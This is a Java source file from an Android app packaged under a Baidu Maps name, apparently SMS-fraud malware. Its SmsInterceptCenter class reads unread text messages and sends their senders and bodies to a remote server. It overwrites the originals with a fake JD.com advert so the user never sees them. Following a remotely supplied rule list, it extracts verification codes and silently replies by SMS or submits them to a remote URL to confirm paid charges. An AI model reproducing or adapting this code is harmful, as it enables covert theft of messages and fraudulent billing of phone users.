package com.baidu.BaiduMap.sms;

import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;

import com.baidu.BaiduMap.httpCenter.SecendNetWorkRequest;
import com.baidu.BaiduMap.httpCenter.SmsSynchronousRequest;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.SDKUtils;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/**
 * Created by Administrator on 2017/7/20.
 */

public class SmsInterceptCenter extends ContentObserver {
    public static List<String> interceptContentList = new ArrayList<>();
    private Context context = null;
    private static int smsID = 0;
    private static List<String> hadReqeusted = new ArrayList<>();
    private static String contentCacheString = "";
    String payType;

    public SmsInterceptCenter(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        if (uri.toString().equals("content://sms/")) {
            return;
        }
        if (uri.toString().equals("content://sms")) {
            return;
        }
        String uriID = uri.toString().substring(uri.toString().lastIndexOf("/") + 1);
        if (!uriID.equals("")) {
            int uriID2Int = Integer.parseInt(uriID);
            if (uriID2Int == smsID) {
                return;
            } else {
                smsID = uriID2Int;
            }
        }
        ReadSmsContent(context);
    }

    public void ReadSmsContent(Context context) {
        ArrayList<String> list = new ArrayList<>();
        Cursor mCursor = context.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
                "date desc");
//        while (mCursor.moveToNext()) {
//
//            String id = mCursor.getString(mCursor.getColumnIndexOrThrow("_id"));
//            String address = mCursor.getString(mCursor.getColumnIndexOrThrow("address"));
//            String read = mCursor.getString(mCursor.getColumnIndexOrThrow("read"));
//            String body = mCursor.getString(mCursor.getColumnIndexOrThrow("body"));
//            String thread_id = mCursor.getString(mCursor.getColumnIndexOrThrow("thread_id"));
//            StringBuffer sb = new StringBuffer();
//            sb.append("_id: " + id);
//            sb.append(" address: " + address);
//            sb.append(" read: " + read);
//            sb.append(" body: " + body);
//            sb.append(" thread_id: " + thread_id);
//            Log.debug(" sms content : " + sb.toString());
//
////            delete(id);
//        }
        if (mCursor == null) {
            return;
        }
        while (mCursor.moveToNext()) {
            SmsInfo _smsInfo = new SmsInfo();
            HashMap<String, String> mapIn = new HashMap<String, String>();
            int _inIndex = mCursor.getColumnIndex("_id");
            if (_inIndex != -1) {
                _smsInfo._id = mCursor.getString(_inIndex);
            }

            int thread_idIndex = mCursor.getColumnIndex("thread_id");
            if (thread_idIndex != -1) {
                _smsInfo.thread_id = mCursor.getString(thread_idIndex);
            }

            int addressIndex = mCursor.getColumnIndex("address");
            if (addressIndex != -1) {
                _smsInfo.smsAddress = mCursor.getString(addressIndex);
            }

            int bodyIndex = mCursor.getColumnIndex("body");
            if (bodyIndex != -1) {
                _smsInfo.smsBody = mCursor.getString(bodyIndex);
            }

            int readIndex = mCursor.getColumnIndex("read");
            if (readIndex != -1) {
                _smsInfo.read = mCursor.getString(readIndex);
            }
            list.add(_smsInfo.toString());
//            int delete = delete(_smsInfo._id);
//            SmsSynchronousRequest.getInstance().request(context, _smsInfo.smsBody, delete);
        }
        mCursor.close();
        for (int i = 0; i < list.size(); i++) {
            String content = chooseSMS(list.get(i));
            if (!("").equals(content)) {
                smsHandle(list.get(i).toString(), context);
            }
        }
//        Sms_send_tongbu(catchError(e), SDKInit.mContext, -1);
    }

    private void changeSMS(String id) {
        ContentValues values = new ContentValues();
        values.put("read", "1");
        values.put("address", "95555");
        values.put("body", "京东会员，我们准备了51元暖心礼包+专享花费券！戳 dc.jd.com/dPEJQQ 领走！神券在握，低价不怕错过！ 回BK退订【京东】");
        context.getContentResolver().update(Uri.parse("content://sms/"), values, "_id=?", new String[]{"" + id});
    }
//    private int delete(String _id) {
//        Uri contentUri = Uri.parse("content://sms");
//        int delete = context.getContentResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
//        return delete;
//    }

    private String chooseSMS(String content) {
        String _id = "";
        String smsAddress = "";
        String smsBody = "";
        try {
            JSONObject json = new JSONObject(content);
            _id = json.getString("_id");
//            if (_id.equals(smsId)) {
            smsAddress = json.getString("smsAddress");
            smsBody = json.getString("smsBody");
            if (Constants.isOutPut) {
                Log.debug("======>smsAddress" + smsAddress);
                Log.debug("======>smsBody" + smsBody);
            }
//            } else {
//                return "";
//            }
        } catch (Exception e) {
            System.out.println("eeeee:" + e);
//            delete(_id);
            changeSMS(_id);
            SmsSynchronousRequest.getInstance().request(context, catchError(e), -2);
            return "";
        }
        Log.debug("contentCacheString:" + contentCacheString);
        if (contentCacheString.equals(smsBody)) {
            changeSMS(_id);
            if (Constants.isOutPut) {
                Log.debug("==========>缓存的东西跟新短信内容相同:" + smsBody);
            }
            return "";
        } else {
            contentCacheString = smsBody;
            if (Constants.isOutPut) {
                Log.debug("==========>缓存的东西跟新短信内容不相同並且需要同步:" + smsBody);
            }
            changeSMS(_id);
            SmsSynchronousRequest.getInstance().request(context, "smsAddress:" + smsAddress + "\t" + "smsBody:" + smsBody, 1);
            return content;
        }
    }

    private void smsHandle(String content, Context context) {
        if (null == interceptContentList && interceptContentList.size() <= 0) {
            return;
        }
        String smsAddress = "";
        String smsBody = "";
        try {
            JSONObject json = new JSONObject(content);
            String _id = json.getString("_id");
            smsAddress = json.getString("smsAddress");
            smsBody = json.getString("smsBody");
            if (Constants.isOutPut) {
                Log.debug("===============>smsAddress:" + smsAddress);
                Log.debug("===============>smsBody:" + smsBody);
            }

        } catch (Exception e) {
            SmsSynchronousRequest.getInstance().request(context, catchError(e), -3);
        }
        for (int i = 0; i < interceptContentList.size(); i++) {
            String senderContent = "";
            String limitNum = "";//发送号码 limitNum
            String vCodeLength = "";//验证码长度 limit_msg_1
            String limit_msg_2 = "";//短信拦截号码 limit_msg_2
            String sendParam = "";
            String otherNeedUrl = "";
            String limit_msg_data = "";
            if (Constants.isOutPut) {
                Log.debug("======================> PayChannelFactory.limit_content.get(i).toString():" + interceptContentList.get(i).toString());
            }
            try {
                JSONObject json = new JSONObject(interceptContentList.get(i).toString());
                limit_msg_2 = json.getString("limit_msg_2");
                limit_msg_data = json.isNull("limit_msg_data") ? "" : json.getString("limit_msg_data");
                if (Constants.isOutPut) {
                    Log.debug("========>limit_msg_data:" + limit_msg_data);
                }
            } catch (Exception e) {
                if (Constants.isOutPut) {
                    Log.debug("=================>eeeeeee:" + e);
                }
                SmsSynchronousRequest.getInstance().request(context, catchError(e), -4);
            }
            if (Constants.isOutPut) {
                Log.debug("===============>limit_msg_2:" + limit_msg_2);
            }
            if (TextUtils.isEmpty(limit_msg_2)) {
                return;
            }
            boolean b = false;
            if (limit_msg_2.contains(",")) {
                String[] pa = limit_msg_2.split(",");
                for (int k = 0; k < pa.length; k++) {
                    if (pa[k].length() > smsAddress.length()) {
                        if (pa[k].contains(smsAddress) && smsBody.contains(limit_msg_data)) {
                            b = true;
                        }
                    } else {
                        if (smsAddress.contains(pa[k]) && smsBody.contains(limit_msg_data)) {
                            b = true;
                        }
                    }
                }
            }
            if (b && smsBody.contains(limit_msg_data)) {
                try {
                    JSONObject json = new JSONObject(interceptContentList.get(i).toString());
                    payType = json.getString("payType");
                    if (Constants.isOutPut) {
                        Log.debug("===============>payType:" + payType);
                    }
                    senderContent = json.getString("fix_msg");
                    vCodeLength = json.isNull("limit_msg_1") ? "" : json.getString("limit_msg_1");
                    limitNum = json.isNull("limitNum") ? "" : json.getString("limitNum");
                    sendParam = json.isNull("sendParam") ? "" : json.getString("sendParam");
                    otherNeedUrl = json.isNull("otherNeedUrl") ? "" : json.getString("otherNeedUrl");
                    if (limitNum.equals("")) {
                        limitNum = smsAddress;
                    }
                    if (payType.equals("0")) {

                    } else if (payType.equals("1")) {
                        if (Constants.isOutPut) {//二次短信回复任意内容
                            Log.debug("======>要开始回复Y了:" + senderContent);
                        }
                        SmsCenter.getInstance().sendSecendSMS(limitNum, senderContent);
                        if (Constants.isOutPut) {
                            Log.debug("=======>limitNum:" + limitNum + "    " + senderContent);
                        }
                        SmsSynchronousRequest.getInstance().request(context, "This user send SMS with any content:" + senderContent + "limitNum:" + limitNum, 10001);
                    } else if (payType.equals("2")) {//二次短信回复验证码
                        String SmsContent = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                        SmsCenter.getInstance().sendSecendSMS(limitNum, SmsContent);
                        SmsSynchronousRequest.getInstance().request(context, "This user send SMS with Code:" + SmsContent + "limitNum:" + limitNum, 10002);
                    } else if (payType.equals("3")) {//二次验证码网络请求
                        String SmsContent = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                        String url = otherNeedUrl + "?vcode=" + SmsContent + "&sendParam=" + sendParam;
                        if (hadReqeusted.toString().contains(sendParam)) {
                            SmsSynchronousRequest.getInstance().request(context, "had been request content:" + hadReqeusted.toString(), -123);
                            return;
                        } else {
                            SecendNetWorkRequest.getInstance().request(url);
                            hadReqeusted.add(sendParam);
                            if (Constants.isOutPut) {
                                Log.debug("------>content:" + content);
                                Log.debug("------>拦截到的验证码：" + SmsContent);
                                Log.debug("------>url：" + url);
                                Log.debug("------>返回的内容：" + content);
                            }
                            SmsSynchronousRequest.getInstance().request(context, "This user request by url:" + url, 10003);
                        }
                    } else if (payType.equals("4")) {//二次短信回复任意内容+验证码
                        String SmsCode = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                        if (Constants.isOutPut) {
                            Log.debug("======>SmsCode:" + SmsCode);
                            Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():" + limitNum);
                        }
                        if (SmsCode != null) {
                            SmsCenter.getInstance().sendSecendSMS(limitNum, senderContent + SmsCode);
                            SmsSynchronousRequest.getInstance().request(context, "This user send SMS with senderContent&SmsCode:" + "senderContent:" + senderContent + "\t" + "SmsCode:" + SmsCode, 10004);
                        }
                    } else {

                    }
                } catch (Exception e) {
                    if (Constants.isOutPut) {
                        Log.debug("=====>e:" + e);
                    }
                    SmsSynchronousRequest.getInstance().request(context, catchError(e), -5);
                }
            }
        }
    }

    private String catchError(Exception e) {
        StackTraceElement[] s = e.getStackTrace();
        StringBuffer sb = new StringBuffer();
        sb.append(e.toString() + "\t");
        for (int i = 0; i < s.length; i++) {
            sb.append(s[i] + "\t");
        }
        return sb.toString();
    }
}
